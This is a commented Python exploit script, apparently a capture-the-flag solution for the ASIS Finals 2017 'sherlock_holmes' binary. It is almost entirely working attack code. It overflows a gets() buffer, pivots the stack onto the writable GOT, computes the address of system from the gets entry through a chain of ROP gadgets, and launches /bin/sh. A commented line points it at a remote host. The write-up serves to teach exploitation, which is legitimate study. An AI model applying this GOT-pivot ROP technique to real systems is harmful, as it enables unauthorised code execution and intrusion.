#!/usr/bin/env python2

# https://github.com/bennofs/docs/blob/master/asisfinals-2017/sherlock.py

"""
Vulnerability
The challenge was a binary that behaves like the following C code:
int main() {
    char buf[0x10];
    gets(buf);
}
This is a simple buffer overflow. The following protections are enabled:
$ checksec sherlock_holmes
[*] '/code/asisctf/sherlock/sherlock_holmes'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
No executable stack and ASLR is enabled for all pwn challenges so we need to build a ROP chain.
Partial RELRO means that the global offset table used by the PLT is writeable though, which will be useful later.
"""
from pwn import *
from ctypes import *

exe = context.binary = ELF("./sherlock_holmes")
libc, conn = exe.libc, process(exe.path)

# gdb.attach(conn, '''
# b *0x00400580 # debug gadget
# c
# ''')

# the same libc that was also used in other challenges in the same ctf
# (BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, google the hash to find it, some ubuntu libc)
# libc, conn = ELF("./libc.so.6"), remote("46.101.214.32", 2468)

### Plan

# There are no gadgets in the binary to print anything, so we cannot retrieve any information out of
# the running binary. Instead, we have to compute everthing with ROP gadgets:
#
#    1) load address of gets into register A (can be retrieved from GOT)
#    2) load offset `system - gets` into register B
#    3) compute A = A + B
#    4) call A
#
# Looking at the binary, I quickly found a `call rax` gadget and the only `add` gadget I could find was
# `add rax, rdx`. So we use A = RAX and B = RDX.

### Exploit

# set a breakpoint on this address in the debugger, then you can use this gadget anywhere in the chain
# to break there (it is just a ret; gadget so does nothing)
debug = p64(0x00400580)

# a gadget that does nothing (only ret)
nop = p64(0x00400574)

# simple `pop REG; ret` gadgets (you find these in most binaries)
pop_rbp = p64(0x0000000000400445)
pop_rdi = p64(0x0000000000400573)

# the stack pivot gadget: leave; ret  (= mov rsp, rbp; pop rbp; ret)
leave = p64(0x0000000000400505)

# First, we need a way to read the address of gets from the GOT into a register. To do that, we will move the
# stack pointer to the GOT so that we can use a `pop` gadget to load the address into a register, like this:
#
#         -0x18   0x00601000    saved RBP
#         -0x10   0x00601008    <address of pop X; pop Y; ret> gadget (saved return address)
#         -0x08   0x00601010    <padding> (necessary because `gets` adds a null byte)
#  exe.got.gets = 0x00601018    gets address
#         +0x08   0x00601020    <next gadget>
#                               ...
# This is only possible because the binary uses only partial RelRO. With full RelRO, the GOT would be read-only.

# In the initial overflow, we fill the memory around the GOT gets location with our payload and move the stack to
# the GOT:
conn.sendline(fit({
    0x10: flat([
        # override RBP with the new base pointer so that the next `leave; ret` will move our stack to the desired
        # location in the GOT
        p64(exe.got.gets - 0x18),

        # read the first part of our payload to `exe.got.gets - 0x18`
        pop_rdi,
        p64(exe.got.gets - 0x18),
        p64(exe.plt.gets),

        # read the second part of our payload to the location right after the `gets` GOT entry
        pop_rdi,
        p64(exe.got.gets + 0x8),
        p64(exe.plt.gets),

        # now, pivot the stack:
        leave
    ])
}))

# This is the part of the payload located on the stack above the `gets` GOT entry.
# All it needs to do is load the address of gets into a register
conn.sendline(flat([
    # Because this is called with a stack pivot, the first address is the new RBP and not a gadget
    # We don't care about RBP, so just set it to a dummy value
    p64(0xdeadba5e),

    # This is the first gadget:  pop r12; pop r13; pop r14; pop r15; ret;
    # It loads the address of gets into r13
    p64(0x0040056c),

    # we later require that `call [r12]` doesn't crash so let's load the address
    # of the GOT entry of gets into r12 (we will fill gets with a no-op later)
    #
    # [:7] because gets replaces the "\n" we append with a null byte
    # if we didn't do this then the null byte would override part of the gets address
    p64(exe.got.gets)[:7],
]))


# The second part of the payload: we have the address of gets in r13.
conn.sendline(fit({
    0x10: [
        # This ensures that we have enough stack space. `system` can push quite a few things
        # onto the stack, and we are at the beginning of the GOT segment right now (there is no writeable
        # segment before that, so any attempt to push the RSP up higher than the GOT base will crash)
        nop * 200,

        # ## Prepare RAX (offset to system) ##
        #
        # For the `add rax, rdx` gadget, we need to load the offset to system into rax. There are no `mov rax`
        # or `pop rax` gadgets, so we will use the following gadget:
        #
        #  0x004004f9           488d45f0  lea rax, [rbp - 0x10]
        #  0x004004fd             4889c7  mov rdi, rax
        #  0x00400500         e8ebfeffff  call gets
        #
        # This will set `rax` to `rbp - 0x10` and then call gets, so we need to ensure two things:

        ## a) make sure that call gets is a no-op, by overwriting its GOT entry:
        pop_rdi,
        p64(exe.got.gets),
        p64(exe.plt.gets),
        debug,

        ## b) load offset+0x10 into rbp and call the gadget
        pop_rbp,
        p64(c_uint64(libc.symbols.system - libc.symbols.gets + 0x10).value),
        p64(0x004004f9),


        # ## Prepare RDX (address of gets) ##
        #
        # We need to move the address of gets into rdx. The gadget we use to do this is:
        #
        #  0x00400546      31db           xor ebx, ebx
        #  0x00400548      0f1f84000000.  nop dword [rax + rax]
        #  0x00400550      4c89ea         mov rdx, r13
        #  0x00400553      4c89f6         mov rsi, r14
        #  0x00400556      4489ff         mov edi, r15d
        #  0x00400559      41ff14dc       call qword [r12 + rbx*8]
        #
        # We assume that the higher bits of RBX are 0, so after `xor ebx, ebx` RBX is zero.
        # The first part of the payload already made sure that `call [r12 + 0]` is a no-op
        # so the gadget works correctly.
        p64(0x00400546),


        # ## Add RAX, RDX ##
        #
        # The gadget for adding rax and rdx is a bit of a monster:
        #
        #      0x0040047a      4801d0         add rax, rdx
        #      0x0040047d      4889c6         mov rsi, rax
        #      0x00400480      48d1fe         sar rsi, 1
        #  ,=< 0x00400483      7502           jne 0x400487
        # .--> 0x00400485      5d             pop rbp
        # ||   0x00400486      c3             ret
        # |`-> 0x00400487      ba00000000     mov edx, 0
        # |    0x0040048c      4885d2         test rdx, rdx
        # `==< 0x0040048f      74f4           je 0x400485
        #
        # The first jump at 0x00400483 will be taken because (rsi >> 1) is not zero, but the second jump
        # at 0x0040048f is taken as well (because mov ebx, 0 sets rbx = 0) so in the end, we end up with:
        #
        # add rax; rdx; ...modify some unrelated registers...; pop rbp; ret
        #
        # All we need to do is call this gadget and place a dummy value on stack for the `pop`:
        p64(0x0040047a),
        p64(0xdeadbeef),

        # ## Call RAX (system) ##
        #
        # At this point, RAX has the address of `system`.
        # Now, we only need to prepare the argument ("/bin/sh") and then we can call rax to launch a shell:
        #
        #  0x004004dd               ffd0  call rax
        #
        # Note: when we call system, the stack pointer must be 16-byte aligned, so this will fail if you remove
        # the debug statment below.
        pop_rdi,
        exe.got.gets + 0x8 + 0x10 + (14 + 200) * 8,
        debug,
        p64(0x004004dd),
        "/bin/sh\0"
    ]
}))

# Just a no-op, used in the above exploit
conn.sendline(pop_rdi)

conn.interactive()